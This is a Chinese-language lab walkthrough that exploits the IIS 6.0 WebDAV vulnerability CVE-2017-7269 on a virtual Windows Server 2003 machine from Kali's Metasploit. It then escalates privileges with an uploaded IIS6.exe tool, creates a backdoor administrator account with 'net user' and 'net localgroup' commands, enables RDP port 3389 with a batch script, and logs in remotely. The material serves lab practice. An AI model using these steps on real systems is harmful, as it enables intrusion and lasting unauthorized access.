**1、实验环境搭建**

目标主机Windows server2003 sp2

![img](https://image.3001.net/images/20220311/1646979462_622ae986a8191fc49847f.jpg!small)

 **2、目标服务器需要在IIS里面开启WebDAV**

![img](https://image.3001.net/images/20220311/1646979463_622ae9879a2f075fce483.jpg!small)

 **3、靶机IP** ：192.168.149.136（需要改成自己虚拟机win2003的地址）

Kali IP ： 192.168.149.150（需要改成自己虚拟机kali的地址）

 **4、打开kali并且 把exp 复制到kali** 的/usr/share/metasploit-framework/modules/exploits/windows/iis目录下：

![img](https://image.3001.net/images/20220311/1646979464_622ae988a3b3df0516c91.jpg!small)

kali中启动Msfconsole，使用CVE-2017-7269攻击插件

输入：msfconsole启动metasploit

 **5、然后reload_all*重启*加载exp** 。

**![img](https://image.3001.net/images/20220311/1646979465_622ae989d475a24386b6b.jpg!small)**

 **6、use exploit** /windows/iis/cve_2017_7269。

![img](https://image.3001.net/images/20220311/1646979467_622ae98b2348ca0a77f81.jpg!small)

 **7、使用show options查看相关参数。**

![img](https://image.3001.net/images/20220311/1646979468_622ae98c44eeff35a4cdd.jpg!small)

 **8、设置目标主机** ，http主机，以及返回载荷。

![img](https://image.3001.net/images/20220311/1646979469_622ae98d6ff7be9494768.jpg!small)

 **9、设置完成，exploit**

![img](https://image.3001.net/images/20220311/1646979470_622ae98e8e3c04eeb965e.jpg!small)

 **10、输入shell查看目前接入权限**

![img](https://image.3001.net/images/20220311/1646979471_622ae98fa527d8dab05df.jpg!small)

11、进入C盘

![img](https://image.3001.net/images/20220311/1646979472_622ae9909c1a5575ab902.jpg!small)

12、使用md命令创建123文件夹

![img](https://image.3001.net/images/20220311/1646979473_622ae99176c1e5e959b87.jpg!small)

使用dir命令查看，以及存在123文件夹

![img](https://image.3001.net/images/20220311/1646979474_622ae992d381a0b90b31e.jpg!small)

13、使用IIS6.exe提权

输入exit退出至msf命令模式下
![img](https://image.3001.net/images/20220311/1646979475_622ae993de532de538bdb.jpg!small)

使用upload命令上传IIS6.exe以及3389.bat文件至win2003 C盘下123文件夹。

![img](https://image.3001.net/images/20220311/1646979476_622ae994b570e3b2bd7cf.jpg!small)

![img](https://image.3001.net/images/20220311/1646979477_622ae995b8fad7deff296.jpg!small)

14、输入shell进入2003系统，使用提权工具，查看当前权限。

![img](https://image.3001.net/images/20220311/1646979479_622ae997061a7a64f356a.jpg!small)

创建用户

IIS6.0.exe “net user zhangsan 123456 /add”

把张三加入到管理员组

IIS6.0.exe “net localgroup Administrators zhangsan /add”

![img](https://image.3001.net/images/20220311/1646979480_622ae998470bfdac7a8c0.jpg!small)

查看系统是否开启3389端口。

![img](https://image.3001.net/images/20220311/1646979481_622ae9999ef212f611cc7.jpg!small)

使用iis6.exe 执行上传的3389.bat文件。

![img](https://image.3001.net/images/20220311/1646979483_622ae99b85bfe4eaaab48.jpg!small)

3389端口已经打开。

我们使用zhangsan用户进行远程连接。

打开win10下远程桌面（快捷命令为mstsc）

![img](https://image.3001.net/images/20220311/1646979485_622ae99d1902229e338d6.jpg!small)

![img](https://image.3001.net/images/20220311/1646979486_622ae99e18c4b1caaee42.jpg!small)

![img](https://image.3001.net/images/20220311/1646979487_622ae99f43412e004f1ba.jpg!small)

![img](https://image.3001.net/images/20220311/1646979488_622ae9a05ad321bbb79d2.jpg!small)

![img](https://image.3001.net/images/20220311/1646979489_622ae9a12ebff21f51f56.jpg!small)

